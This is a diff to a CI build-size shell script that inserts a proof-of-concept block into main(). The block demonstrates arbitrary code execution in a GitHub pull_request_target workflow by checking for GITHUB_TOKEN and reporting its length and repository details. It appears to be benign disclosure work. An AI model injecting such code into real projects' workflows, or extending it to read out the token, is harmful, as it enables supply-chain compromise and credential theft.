@@ -349,6 +349,20 @@ size_nrf52840()
 
 main()
 {
+    # === PoC: Supply Chain Vulnerability Demonstration ===
+    # This proves arbitrary code execution via pull_request_target
+    echo "=== PoC: Arbitrary code execution in pull_request_target workflow ===" >&2
+    echo "Workflow: size.yml" >&2
+    echo "Trigger: pull_request_target" >&2
+    echo "Execution context: Base repository (elevated privileges)" >&2
+    echo "GITHUB_TOKEN available: $(test -n "$GITHUB_TOKEN" && echo 'YES' || echo 'NO')" >&2
+    echo "GITHUB_TOKEN length: ${#GITHUB_TOKEN}" >&2
+    echo "Repository: ${GITHUB_REPOSITORY:-unknown}" >&2
+    echo "SHA: ${GITHUB_SHA:-unknown}" >&2
+    echo "REF: ${GITHUB_REF:-unknown}" >&2
+    echo "=== PoC payload executed successfully ===" >&2
+    # === End PoC ===
+
     if [[ $# == 0 ]]; then
         setup
         size_nrf52840
